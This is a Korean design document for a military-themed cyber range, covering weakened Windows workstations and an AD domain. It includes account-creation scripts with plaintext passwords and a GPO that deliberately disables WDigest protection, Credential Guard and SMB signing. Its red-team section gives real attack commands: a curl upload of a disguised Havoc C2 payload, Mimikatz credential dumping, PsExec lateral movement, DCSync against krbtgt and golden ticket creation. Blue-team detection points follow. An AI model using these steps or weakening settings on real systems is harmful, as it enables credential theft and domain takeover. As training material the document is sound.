# 자산 설계서 #I10~#I11 — 군 업무용 PC + 관리자 PC + AD

| 항목 | 내용 |
|------|------|
| 자산 ID | I10 (업무용 PC 1~5), I11 (관리자 PC) |
| IP 범위 | 192.168.110.31~35 (업무용 PC), 192.168.110.40 (관리자 PC) |
| OS | Windows 10/11 Pro 22H2 |
| AD 도메인 | corp.mnd.local |
| DC | MIL-DC01 (192.168.110.50) |
| 역할 | 군 사용자 워크스테이션 + 도메인 관리자 워크스테이션 |
| 네트워크 구간 | 군 INT (192.168.110.0/24) |
| 훈련 시나리오 위치 | STEP 4-2 결과 (공급망 감염) → 내부 확산 → AD 장악 |
| 작성일 | 2026-03-26 |

---

## 1. 개요

### 1.1 자산 목적

군 업무용 PC 5대와 관리자 PC 1대는 Active Directory 도메인 `corp.mnd.local`에 가입된 Windows 워크스테이션이다. 공공기관 INT의 PC/AD 구성(자산 #09~#11)과 동일한 아키텍처를 따르되, 군 조직 및 계정 체계를 적용하고, **패치 관리 서버 자동 업데이트 클라이언트**가 추가 설치된다.

### 1.2 훈련에서의 역할

이 자산은 **공급망 공격의 최종 피해 대상**이다. 패치 관리 서버에서 교체된 악성 업데이트(SecurityPatch_KB2024001.exe)를 자동 다운로드/실행하여 Havoc C2 Demon 에이전트가 설치되며, 이후 Mimikatz 자격증명 탈취, PsExec 측면 이동, DCSync 도메인 장악으로 이어진다.

### 1.3 공격 체인

```
[STEP 4-2 결과] 패치 서버에서 악성 업데이트 배포
    │
    │  update-checker.ps1 (Scheduled Task, 30분 간격)
    │  → SecurityPatch_KB2024001.exe (Havoc Demon) 자동 실행
    │
    ▼
[PC-1~5 감염] 192.168.110.31~35 — Havoc C2 세션 확립
    │
    ├── Mimikatz 실행
    │   ├── sekurlsa::logonpasswords → mil_admin / MilAdmin2026!
    │   ├── lsadump::sam → 로컬 관리자 해시
    │   └── lsadump::secrets → 서비스 계정 정보
    │
    ├── PsExec 측면 이동 → 관리자 PC (192.168.110.40)
    │   └── mil_admin 자격증명 사용
    │
    ▼
[관리자 PC] 192.168.110.40
    │
    ├── DCSync 공격
    │   └── lsadump::dcsync /domain:corp.mnd.local /user:krbtgt
    │
    ├── krbtgt NTLM 해시 탈취
    │
    └── Golden Ticket 생성 → 도메인 전체 장악
        │
        ▼
    [STEP 5] C4I 진입 (OPNSense-7 → 192.168.130.0/24)
```

### 1.4 환경변수 (공통)

```bash
# 군 INT 공통 환경변수
MIL_AD_DOMAIN=corp.mnd.local
MIL_INT_SUBNET=192.168.110.0/24
MIL_PATCH_SUBNET=192.168.120.0/24
PATCH_SERVER_URL=http://192.168.120.10
```

## 2. 기술 스택

### 2.1 클라이언트 OS

| 구성요소 | 버전/사양 | 용도 |
|----------|-----------|------|
| Windows 10/11 | Pro 22H2 이상 | 업무용 PC 및 관리자 PC OS |

### 2.2 업무용 소프트웨어 (PC 공통)

| 구성요소 | 버전 | 용도 |
|----------|------|------|
| Microsoft Office | 2019/2021 | 문서 작업 |
| Google Chrome | 최신 | 웹 브라우저 |
| 7-Zip | 23.x | 압축 유틸리티 |
| update-checker.ps1 | 1.0 | **패치 서버 자동 업데이트 클라이언트** |

### 2.3 관리자 도구 (I11 관리자 PC 추가)

| 구성요소 | 버전 | 용도 |
|----------|------|------|
| RSAT | Windows 기본 | AD 관리 |
| PowerShell 7.x | 최신 | 관리 스크립트 |
| mstsc | Windows 기본 | 원격 데스크톱 |
| PuTTY | 0.80+ | SSH 접속 |

### 2.4 보안/모니터링 (블루팀용)

| 구성요소 | 버전 | 용도 |
|----------|------|------|
| Sysmon | v15.x | 프로세스/네트워크 이벤트 |
| Windows Event Log | 내장 | 보안 감사 로그 |
| PowerShell Script Block Logging | 내장 GPO | PowerShell 실행 기록 |

## 3. 네트워크 설정

### 3.1 IP 및 네트워크 구성

| 자산명 | 호스트명 | IP 주소 | 서브넷 | 게이트웨이 | DNS |
|--------|---------|---------|--------|-----------|-----|
| 업무용 PC-1 | MIL-PC01 | 192.168.110.31 | /24 | 192.168.110.1 | 192.168.110.50 |
| 업무용 PC-2 | MIL-PC02 | 192.168.110.32 | /24 | 192.168.110.1 | 192.168.110.50 |
| 업무용 PC-3 | MIL-PC03 | 192.168.110.33 | /24 | 192.168.110.1 | 192.168.110.50 |
| 업무용 PC-4 | MIL-PC04 | 192.168.110.34 | /24 | 192.168.110.1 | 192.168.110.50 |
| 업무용 PC-5 | MIL-PC05 | 192.168.110.35 | /24 | 192.168.110.1 | 192.168.110.50 |
| 관리자 PC | MIL-ADMIN01 | 192.168.110.40 | /24 | 192.168.110.1 | 192.168.110.50 |

### 3.2 개방 포트

#### 업무용 PC

| 포트 | 프로토콜 | 서비스 | 비고 |
|------|---------|--------|------|
| 445/tcp | SMB | 파일 공유 | ⚠ SMB 서명 미적용 |
| 3389/tcp | RDP | 원격 데스크톱 | ⚠ 전체 허용 |
| 5985/tcp | WinRM | PowerShell 원격 | ⚠ 전체 허용 |

#### 관리자 PC (추가)

| 포트 | 프로토콜 | 서비스 | 비고 |
|------|---------|--------|------|
| 445/tcp | SMB | 파일 공유 | ⚠ SMB 서명 미적용 |
| 3389/tcp | RDP | 원격 데스크톱 | 서버 관리용 |
| 5985/tcp | WinRM | PowerShell 원격 | 서버 관리용 |

## 4. Active Directory 설계

### 4.1 도메인 기본 정보

| 항목 | 값 |
|------|-----|
| 도메인 이름 (FQDN) | corp.mnd.local |
| NetBIOS 이름 | CORP |
| 포리스트 기능 수준 | Windows Server 2016 |
| 도메인 기능 수준 | Windows Server 2016 |
| DC 호스트명 | MIL-DC01 |
| DC IP | 192.168.110.50 |
| FSMO 역할 | 모두 MIL-DC01 보유 (단일 DC) |

> **참고:** AD DC(192.168.110.50)는 본 문서 범위에서 제외하며, I10/I11 PC에서의 DC 연동 관점에서만 기술한다. DC 상세 설계가 필요한 경우 별도 문서로 작성한다.

### 4.2 OU 계층 구조

```
corp.mnd.local (도메인 루트)
│
├── OU=부서 (Departments)
│   ├── OU=정보통신과
│   │   └── 사용자: mil_admin (김영호)
│   │
│   ├── OU=작전지원과
│   │   └── 사용자: mil_kim (김정수)
│   │
│   ├── OU=정보보호과
│   │   └── 사용자: mil_lee (이현우)
│   │
│   ├── OU=군수지원과
│   │   └── 사용자: mil_park (박서준)
│   │
│   ├── OU=통신운영과
│   │   └── 사용자: mil_choi (최민서)
│   │
│   ├── OU=인사과
│   │   └── 사용자: mil_jung (정유진)
│   │
│   └── OU=전산과
│       └── 사용자: mil_han (한도현)
│
├── OU=워크스테이션 (Workstations)
│   ├── OU=업무용PC
│   │   ├── PC: MIL-PC01 (192.168.110.31)
│   │   ├── PC: MIL-PC02 (192.168.110.32)
│   │   ├── PC: MIL-PC03 (192.168.110.33)
│   │   ├── PC: MIL-PC04 (192.168.110.34)
│   │   └── PC: MIL-PC05 (192.168.110.35)
│   │
│   └── OU=관리자PC
│       └── PC: MIL-ADMIN01 (192.168.110.40)
│
├── OU=서버 (Servers)
│   └── DC: MIL-DC01 (192.168.110.50)
│
├── OU=서비스계정 (Service Accounts)
│   ├── svc_backup (백업 서비스)
│   └── svc_patch (패치 서비스)
│
└── OU=그룹 (Groups)
    ├── GRP-정보통신과
    ├── GRP-작전지원과
    ├── GRP-정보보호과
    ├── GRP-군수지원과
    ├── GRP-통신운영과
    ├── GRP-인사과
    └── GRP-전산과
```

### 4.3 사용자 계정

| 사용자명 | 성명 | 부서 | 역할 | 비밀번호 | 그룹 | 로그온 PC | 비고 |
|----------|------|------|------|----------|------|----------|------|
| mil_admin | 김영호 | 정보통신과 | Domain Admin | MilAdmin2026! | Domain Admins | MIL-ADMIN01 | ⚠ PC-1에 캐시 |
| mil_kim | 김정수 | 작전지원과 | User | Jungsu2026! | Domain Users | MIL-PC01 | 작전 담당 |
| mil_lee | 이현우 | 정보보호과 | User | Hyunwoo123! | Domain Users | MIL-PC02 | ⚠ 약한 PW |
| mil_park | 박서준 | 군수지원과 | User | Seojun2026! | Domain Users | MIL-PC03 | 군수 담당 |
| mil_choi | 최민서 | 통신운영과 | User | Minseo2026! | Domain Users | MIL-PC04 | 통신 담당 |
| mil_jung | 정유진 | 인사과 | User | Yujin2026! | Domain Users | MIL-PC05 | 인사 담당 |
| mil_han | 한도현 | 전산과 | User | Dohyun2026! | Domain Users | MIL-PC01 (보조) | IT 지원 |

### 4.4 사용자 생성 스크립트

```powershell
# ============================================================
# 군 AD 사용자 계정 일괄 생성 스크립트
# 도메인: corp.mnd.local
# ============================================================

Import-Module ActiveDirectory

# OU 생성
$ouPaths = @(
    "OU=부서,DC=corp,DC=mnd,DC=local",
    "OU=워크스테이션,DC=corp,DC=mnd,DC=local",
    "OU=서버,DC=corp,DC=mnd,DC=local",
    "OU=서비스계정,DC=corp,DC=mnd,DC=local",
    "OU=그룹,DC=corp,DC=mnd,DC=local"
)

foreach ($ou in $ouPaths) {
    try { New-ADOrganizationalUnit -Name ($ou -split ',')[0].Replace('OU=','') `
        -Path ($ou -replace '^[^,]+,','') -ProtectedFromAccidentalDeletion $false } catch {}
}

# 부서별 OU
$departments = @("정보통신과", "작전지원과", "정보보호과", "군수지원과", "통신운영과", "인사과", "전산과")
foreach ($dept in $departments) {
    try { New-ADOrganizationalUnit -Name $dept `
        -Path "OU=부서,DC=corp,DC=mnd,DC=local" `
        -ProtectedFromAccidentalDeletion $false } catch {}
}

# 워크스테이션 OU
New-ADOrganizationalUnit -Name "업무용PC" -Path "OU=워크스테이션,DC=corp,DC=mnd,DC=local" -ProtectedFromAccidentalDeletion $false
New-ADOrganizationalUnit -Name "관리자PC" -Path "OU=워크스테이션,DC=corp,DC=mnd,DC=local" -ProtectedFromAccidentalDeletion $false

# 사용자 생성
$users = @(
    @{ Sam="mil_admin"; Name="김영호"; Dept="정보통신과"; Title="과장"; PW="MilAdmin2026!"; Admin=$true },
    @{ Sam="mil_kim";   Name="김정수"; Dept="작전지원과"; Title="소령"; PW="Jungsu2026!";   Admin=$false },
    @{ Sam="mil_lee";   Name="이현우"; Dept="정보보호과"; Title="대위"; PW="Hyunwoo123!";   Admin=$false },
    @{ Sam="mil_park";  Name="박서준"; Dept="군수지원과"; Title="상사"; PW="Seojun2026!";   Admin=$false },
    @{ Sam="mil_choi";  Name="최민서"; Dept="통신운영과"; Title="중위"; PW="Minseo2026!";   Admin=$false },
    @{ Sam="mil_jung";  Name="정유진"; Dept="인사과";     Title="대위"; PW="Yujin2026!";    Admin=$false },
    @{ Sam="mil_han";   Name="한도현"; Dept="전산과";     Title="병장"; PW="Dohyun2026!";   Admin=$false }
)

foreach ($u in $users) {
    $ouPath = "OU=$($u.Dept),OU=부서,DC=corp,DC=mnd,DC=local"

    New-ADUser `
        -SamAccountName $u.Sam `
        -UserPrincipalName "$($u.Sam)@corp.mnd.local" `
        -Name $u.Name `
        -DisplayName $u.Name `
        -Department $u.Dept `
        -Title $u.Title `
        -Path $ouPath `
        -AccountPassword (ConvertTo-SecureString $u.PW -AsPlainText -Force) `
        -Enabled $true `
        -PasswordNeverExpires $true

    if ($u.Admin) {
        Add-ADGroupMember -Identity "Domain Admins" -Members $u.Sam
    }

    Write-Host "[생성] $($u.Sam) ($($u.Name)) - $($u.Dept)"
}

# 그룹 생성 및 멤버십
foreach ($dept in $departments) {
    New-ADGroup -Name "GRP-$dept" -GroupScope Global -GroupCategory Security `
        -Path "OU=그룹,DC=corp,DC=mnd,DC=local"
}

Add-ADGroupMember -Identity "GRP-정보통신과" -Members "mil_admin"
Add-ADGroupMember -Identity "GRP-작전지원과" -Members "mil_kim"
Add-ADGroupMember -Identity "GRP-정보보호과" -Members "mil_lee"
Add-ADGroupMember -Identity "GRP-군수지원과" -Members "mil_park"
Add-ADGroupMember -Identity "GRP-통신운영과" -Members "mil_choi"
Add-ADGroupMember -Identity "GRP-인사과" -Members "mil_jung"
Add-ADGroupMember -Identity "GRP-전산과" -Members "mil_han"

# Remote Desktop Users에 전체 허용 (⚠ 취약)
Add-ADGroupMember -Identity "Remote Desktop Users" -Members "Domain Users"

# 서비스 계정
New-ADUser -SamAccountName "svc_patch" `
    -UserPrincipalName "svc_patch@corp.mnd.local" `
    -Name "패치서비스" `
    -Path "OU=서비스계정,DC=corp,DC=mnd,DC=local" `
    -AccountPassword (ConvertTo-SecureString "PatchSvc2026!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true

Write-Host "[완료] 군 AD 사용자/그룹 생성 완료"
```

### 4.5 GPO 설정 (의도적 약화)

공공기관 INT의 GPO 설정과 동일한 구조를 따른다:

```
비밀번호 정책:
  ├─ 최소 비밀번호 길이:        8자    (⚠ 짧음)
  ├─ 비밀번호 복잡성 요구:      사용 안 함  (⚠ 취약)
  ├─ 계정 잠금 임계값:          0회    (⚠ 잠금 없음)
  └─ 최대 비밀번호 사용 기간:    0일    (⚠ 만료 없음)

보안 설정:
  ├─ WDigest 활성화:           예     (⚠ 평문 PW 메모리 저장)
  ├─ Credential Guard:         비활성화 (⚠ Mimikatz 허용)
  ├─ SMB 서명:                 필수 아님 (⚠ NTLM 릴레이)
  ├─ PowerShell 실행 정책:      Unrestricted (⚠ 악성 스크립트)
  └─ 로컬 Admin 비밀번호:       LocalAdmin1! (⚠ LAPS 미적용)
```

```powershell
# GPO 보안 약화 설정 (군 도메인)
$gpoName = "MIL-PC-보안설정"
New-GPO -Name $gpoName -Comment "군 워크스테이션 보안 설정 (훈련용 의도적 약화)"

# WDigest 활성화
Set-GPRegistryValue -Name $gpoName `
    -Key "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
    -ValueName "UseLogonCredential" -Type DWord -Value 1

# Credential Guard 비활성화
Set-GPRegistryValue -Name $gpoName `
    -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" `
    -ValueName "EnableVirtualizationBasedSecurity" -Type DWord -Value 0

# PowerShell Unrestricted
Set-GPRegistryValue -Name $gpoName `
    -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell" `
    -ValueName "ExecutionPolicy" -Type String -Value "Unrestricted"

# SMB 서명 비활성화
Set-GPRegistryValue -Name $gpoName `
    -Key "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
    -ValueName "RequireSecuritySignature" -Type DWord -Value 0

# GPO 연결
New-GPLink -Name $gpoName -Target "OU=워크스테이션,DC=corp,DC=mnd,DC=local"
```

## 5. Havoc C2 Demon 페이로드 구성

### 5.1 페이로드 생성 (레드팀)

```bash
# Havoc C2 Demon 페이로드 생성 (SecurityPatch_KB2024001.exe로 위장)
# Havoc 클라이언트에서 실행

# Demon 구성:
#   - 통신: HTTPS
#   - Sleep: 10초 (훈련용 단축)
#   - Jitter: 30%
#   - User Agent: Microsoft-Delivery-Optimization/10.0
#   - 프로세스 인젝션: svchost.exe

# 빌드 후 패치 서버에 업로드
curl -u admin:admin123 \
    -F "update_file=@SecurityPatch_KB2024001.exe" \
    http://192.168.120.10/admin/upload.php
```

### 5.2 감염 후 공격 절차

```
# 1. Havoc C2 세션 확립 확인
# 2. Mimikatz 실행
dotnet inline-execute Mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 3. 캐시된 자격증명 발견
#    mil_admin / MilAdmin2026! (Domain Admin)

# 4. PsExec 측면 이동 → 관리자 PC
psexec \\192.168.110.40 -u corp\mil_admin -p MilAdmin2026! cmd.exe

# 5. DCSync 공격
lsadump::dcsync /domain:corp.mnd.local /user:krbtgt

# 6. Golden Ticket 생성
kerberos::golden /domain:corp.mnd.local /sid:S-1-5-21-XXXX /krbtgt:<hash> /user:Administrator /id:500
```

## 6. 블루팀 탐지 포인트

| 탐지 대상 | 로그 소스 | IoC |
|-----------|----------|-----|
| 악성 업데이트 실행 | Sysmon (Event 1), Windows Security | SecurityPatch_KB2024001.exe → 비정상 자식 프로세스 |
| Havoc C2 통신 | Sysmon (Event 3) | svchost.exe에서 외부 HTTPS 연결 |
| Mimikatz 실행 | Sysmon (Event 10), Security (4688) | lsass.exe 접근, sekurlsa 관련 |
| PsExec 측면 이동 | Security (4624, 4672) | Type 3 로그온, 관리자 권한 할당 |
| DCSync | Security (4662) | DS-Replication-Get-Changes 권한 사용 |
| Golden Ticket | Security (4769) | 비정상 TGS 요청, 수명이 긴 티켓 |
| 자동 업데이트 | PowerShell 로그 | update-checker.ps1 실행, Invoke-WebRequest |

---

## 7. OPNSense 방화벽 규칙 (I10/I11 관련)

### 7.1 OPNSense-6 (군 INT 측)

```
Interface: INT (군 INT 측)
┌─────┬──────────────────┬────────────────────┬──────────┬────────┬─────────────────────────┐
│  #  │     출발지         │       목적지         │   포트    │  동작   │         비고             │
├─────┼──────────────────┼────────────────────┼──────────┼────────┼─────────────────────────┤
│  1  │ 192.168.110.0/24  │ 192.168.120.10     │ 80/tcp   │ ALLOW  │ PC → 패치서버 업데이트    │
│  2  │ 192.168.110.0/24  │ 192.168.110.0/24   │ *        │ ALLOW  │ INT 내부 통신 전체 허용   │
└─────┴──────────────────┴────────────────────┴──────────┴────────┴─────────────────────────┘
```

### 7.2 OPNSense-7 (군 INT ↔ C4I)

```
Interface: INT (군 INT 측)
┌─────┬──────────────────┬────────────────────┬──────────┬────────┬─────────────────────────┐
│  #  │     출발지         │       목적지         │   포트    │  동작   │         비고             │
├─────┼──────────────────┼────────────────────┼──────────┼────────┼─────────────────────────┤
│  1  │ 192.168.110.40    │ 192.168.130.0/24   │ *        │ ALLOW  │ 관리자 PC → C4I 관리     │
│  2  │ 192.168.110.50    │ 192.168.130.0/24   │ 53,88,389│ ALLOW  │ DC → C4I AD 서비스       │
│  3  │ 192.168.110.0/24  │ 192.168.130.0/24   │ *        │ DENY   │ 일반 PC → C4I 차단       │
└─────┴──────────────────┴────────────────────┴──────────┴────────┴─────────────────────────┘

Interface: C4I (C4I 측)
┌─────┬──────────────────┬────────────────────┬──────────┬────────┬─────────────────────────┐
│  #  │     출발지         │       목적지         │   포트    │  동작   │         비고             │
├─────┼──────────────────┼────────────────────┼──────────┼────────┼─────────────────────────┤
│  1  │ 192.168.130.0/24  │ 192.168.110.50     │ 389,88   │ ALLOW  │ C4I → DC 인증            │
│  2  │ 192.168.130.0/24  │ 192.168.110.0/24   │ *        │ DENY   │ C4I → INT 역방향 차단     │
└─────┴──────────────────┴────────────────────┴──────────┴────────┴─────────────────────────┘
```

## 8. DNS 레코드

```
; AD 통합 DNS (192.168.110.50)
; Forward Lookup Zone: corp.mnd.local
mil-dc01.corp.mnd.local.      IN  A     192.168.110.50
mil-pc01.corp.mnd.local.      IN  A     192.168.110.31
mil-pc02.corp.mnd.local.      IN  A     192.168.110.32
mil-pc03.corp.mnd.local.      IN  A     192.168.110.33
mil-pc04.corp.mnd.local.      IN  A     192.168.110.34
mil-pc05.corp.mnd.local.      IN  A     192.168.110.35
mil-admin01.corp.mnd.local.   IN  A     192.168.110.40

; SRV Records (AD 자동 생성)
_ldap._tcp.corp.mnd.local.     IN  SRV   0 100 389  mil-dc01.corp.mnd.local.
_kerberos._tcp.corp.mnd.local. IN  SRV   0 100 88   mil-dc01.corp.mnd.local.
_gc._tcp.corp.mnd.local.       IN  SRV   0 100 3268 mil-dc01.corp.mnd.local.
```

## 9. 로그 수집 구성

```
수집 대상:
├── I10 (192.168.110.31~35)
│   ├── Windows Security Event Log
│   ├── Sysmon Event Log
│   ├── PowerShell Script Block Log
│   └── C:\ProgramData\MND\UpdateService\update.log
│
└── I11 (192.168.110.40)
    ├── Windows Security Event Log
    ├── Sysmon Event Log
    ├── PowerShell Script Block Log
    └── C:\ProgramData\MND\UpdateService\update.log
```

## 10. MITRE ATT&CK 매핑 (I10/I11 관련)

| 우선순위 | 기법 | ATT&CK ID | 자산 | 탐지 방법 |
|---------|------|-----------|------|----------|
| 1 (긴급) | Supply Chain Compromise | T1195.002 | I10 PC | 파일 해시 변경, 비정상 프로세스 트리 |
| 2 (긴급) | Credential Dumping | T1003.001 | I10 → I11 | lsass.exe 접근 이벤트 |
| 3 (높음) | Lateral Movement (PsExec) | T1021.002 | I10 → I11 | SMB + 서비스 생성 이벤트 |
| 4 (높음) | DCSync | T1003.006 | I11 → DC | 복제 권한 사용 이벤트 |
